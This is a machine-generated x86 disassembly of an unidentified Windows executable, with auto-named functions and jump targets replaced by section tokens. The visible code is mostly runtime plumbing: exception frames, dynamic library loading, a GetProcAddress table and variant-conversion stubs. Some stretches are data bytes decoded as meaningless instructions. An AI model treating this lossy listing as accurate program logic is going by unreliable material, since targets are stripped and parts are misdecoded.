cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40ce90
mov eax esi
call sub_40ce84
sub_40d008
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cce8
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cd60
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cc58
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40ce84
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40ce84
sub_40d080
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d0a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d11b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405874
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403344
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d122
lea eax [ ebp - 0x4 ]
call sub_405874
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403344
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d080
test al al
jne r-xdata
mov al 0x1
sub_40d13c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d1ae
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d190
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4044c8
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d197
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d1c0
sbb eax 0x4000000
push ebx
inc edi
add [ eax + 0x62 ] al
inc edi
add ah bh
push edx
inc edi
add [ ecx + 0x47 ] dl
add ah dh
push edx
inc edi
add al dl
pop edi
inc edi
add ah ch
push edx
inc edi
add [ eax - 0x1bffb89e ] cl
push edx
inc edi
add [ eax - 0x23ffb89e ] bh
push edx
inc edi
add [ eax + 0x47 ] bh
add ah dl
push edx
inc edi
add [ eax ] bh
popad
inc edi
add ah cl
push edx
inc edi
add [ edi + ebx * 2 + 0x52c40047 ] dl
inc edi
add [ eax - 0x43ffb89f ] cl
push edx
inc edi
add ah dl
popad
inc edi
add [ edx + edx * 2 + 0x610c0047 ] dh
inc edi
add [ edx + edx * 2 + 0x61140047 ] ch
inc edi
add [ edx + edx * 2 + 0x63300047 ] ah
inc edi
add [ edx + edx * 2 + 0x61100047 ] bl
inc edi
add [ edx + edx * 2 + 0x63b00047 ] dl
inc edi
add [ edx + edx * 2 + 0x62140047 ] cl
inc edi
add [ edx + edx * 2 + 0x61f00047 ] al
inc edi
add [ edx + edx * 2 + 0x47 ] bh
add ah al
arpl [ edi ] ax
je r-xdata
and [ ecx + 0x47 ] ah
add [ eax ] ch
add [ eax ] al
add [ edx + edx * 2 ] bl
inc edi
add [ eax ] dl
arpl [ edi ] ax
add [ eax ] al
add [ eax ] al
sbb [ edx + 0x47 ] dl
add ah bl
pop edi
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + edx * 2 ] dl
inc edi
add [ edx + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] dl
push edx
inc edi
add [ edi + ebx * 2 + 0x47 ] ch
add [ eax ] al
or al 0x52
inc edi
add [ eax + 0x60 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] cl
push edx
inc edi
add [ eax ] bh
pushad
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + edx * 2 ] al
inc edi
add ah dh
pop edi
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
inc edi
add [ ecx ] bl
inc edi
add [ eax ] al
add [ eax ] al
add ah bh
push ecx
inc edi
add [ eax ] dl
bound eax [ edi ]
add [ eax ] al
add [ eax ] al
clc
push ecx
inc edi
add [ eax ] bh
inc edi
add [ eax ] al
add [ eax ] al
add ah dh
push ecx
inc edi
add ah ah
popad
inc edi
add [ eax ] al
add [ eax ] al
add al dh
push ecx
inc edi
add [ edx + 0x47 ] dh
add [ eax ] al
in al dx
push ecx
inc edi
add [ edx + 0x47 ] ah
add [ eax ] al
call 0x30411aa2
bound eax [ edi ]
add [ eax ] al
add [ eax ] al
in al 0x51
inc edi
add [ eax ] cl
popad
inc edi
add [ eax ] al
add [ eax ] al
add al ah
push ecx
inc edi
add [ eax + 0x4760 ] bh
add [ eax ] al
add ah bl
push ecx
inc edi
add [ eax + 0x475f ] ch
add [ eax ] al
add al bl
push ecx
inc edi
add [ eax + 0x4762 ] ah
add [ eax ] al
add ah dl
push ecx
inc edi
add [ ecx + 0x47 ] dh
add [ eax ] al
rcl [ ecx + 0x47 ] 0x1
add [ eax + 0x47 ] ah
add [ eax ] al
int3
inc edi
add [ ebx + 0x47 ] dh
add [ edx + edx * 2 + 0x47 ] ch
add [ ecx ] ah
inc edi
add [ edx + edx * 2 + 0x47 ] ah
add [ eax ] bh
arpl [ edi ] ax
pop esp
push edx
inc edi
add [ eax + 0x63 ] cl
inc edi
add [ edx + edx * 2 + 0x47 ] dl
add [ eax + 0x47 ] ah
add [ edx + edx * 2 + 0x47 ] cl
add [ eax ] ch
pushad
inc edi
add [ edx + edx * 2 + 0x47 ] al
add ah ch
popad
inc edi
add [ edx + edx * 2 ] bh
inc edi
add [ eax + 0x34004762 ] al
push edx
inc edi
add [ eax + 0x2c00475f ] ah
push edx
inc edi
add [ ebx ] ch
inc edi
add [ edx + edx * 2 ] ah
inc edi
add [ eax ] ah
popad
inc edi
sub_40d3a1
push ecx
inc edi
add [ ecx + 0x47 ] al
add [ eax ] al
enter 0x4751 0x0
cld
popad
inc edi
add [ eax ] al
add [ eax ] al
add ah al
push ecx
inc edi
add [ ecx + 0x47 ] bl
add [ eax ] al
rcl [ ecx + 0x47 ] 0x0
fsub [ eax + 0x47 ]
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 + 0x5fa40047 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x44004751 ] bh
popad
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 + 0x63500047 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0xbffb8af ] dh
bound eax [ edi ]
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
push ecx
inc edi
add al ah
popad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x60004751 ] ch
pushad
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 + 0x5fb80047 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffb8af ] ah
bound eax [ edi ]
add [ eax ] al
add [ eax ] al
pushfd
push ecx
inc edi
add al ch
arpl [ edi ] ax
add [ eax ] al
add [ eax ] al
cwde
push ecx
inc edi
add ah bh
pop edi
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 + 0x5f900047 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x24004751 ] dl
arpl [ edi ] ax
add [ eax ] al
add [ eax ] al
mov [ ecx + 0x47 ] ss
add ah bl
popad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x73ffb8af ] cl
arpl [ edi ] ax
add [ eax ] al
add [ eax ] al
push ecx
inc edi
add [ ecx ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x51 ] ah
inc edi
add [ eax + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40d605
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d60c
retn
mov eax rw-data
call sub_40d070
call sub_40cbdc
call sub_40bed0
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40b9a8 ]
call sub_404a84
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a84
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a84
mov eax rw-data
call sub_404008
mov eax rw-data
mov edx [ r-xdata ]
call sub_4051c8
mov eax rw-data
mov edx [ r-xdata ]
call sub_4051c8
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a84
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a84
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a84
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a84
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a84
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_4046e8
mov eax rw-data
call sub_404008
sub_40d610
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d678
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d67f
retn
mov eax sub_40d1c0
call sub_403db4
mov eax r-xdata
call sub_403ddc
cmp [ rw-data ] 0x0
je r-xdata
call sub_40be4c
call sub_40bf50
call sub_40cbfc
call sub_40c794
mov eax rw-data
mov edx r-xdata
call sub_40405c
sub_40d6b0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d704
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d75e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4081c0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d765
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40d770
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d7ca
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4094d4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7d1
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40d7dc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d836
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4094a8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d83d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40d848
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d8a2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40aefc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8a9
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40d8b4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d90e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409500
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d915
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40d920
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d98d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404290
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_4082cc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d994
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_40d9a0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40da00
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40945c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404834
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da07
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40da10
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40da70
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a688
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404834
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da77
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40da80
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dae4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408368
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404834
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40daeb
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40db14
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40db40
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d6b0
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6e0
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6e0
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ec
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ec
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ec
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ec
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ec
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ec
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ec
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ec
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6ec
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6f8
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d704
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d770
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7dc
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d848
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8b4
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d920
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9a0
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da10
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da80
mov eax r-xdata
call sub_40db14
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40de4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40de71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de78
retn
sub_40dfac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_40e4cc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e516
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e51d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40e520
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e5af
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413c9c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413c9c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5b6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40402c
retn
sub_40e5bc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e606
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e60d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40e610
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e65a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e661
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40e664
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e6f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413c9c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413c9c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e6fa
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40402c
retn
sub_40e700
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e74a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e751
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40e754
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e999
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9a0
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_40402c
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
jmp r-xdata
dec eax
je r-xdata
call sub_40e4cc
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
jmp r-xdata
jmp r-xdata
call sub_40e5bc
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40af88
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
jmp r-xdata
jmp r-xdata
sub_40e9b4
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e520
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e664
jmp r-xdata
jmp r-xdata
call sub_40e754
sub_40e9e8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_40275c
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
call sub_40275c
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40e9b4
pop esi
pop ebx
retn
call sub_40275c
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40e9b4
jmp r-xdata
call sub_40279c
mov edx eax
mov eax edx
call sub_403a44
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40e9b4
jmp r-xdata
pop esi
pop ebx
retn
sub_40ea6c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eab6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eabd
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40ead4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40eb04
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
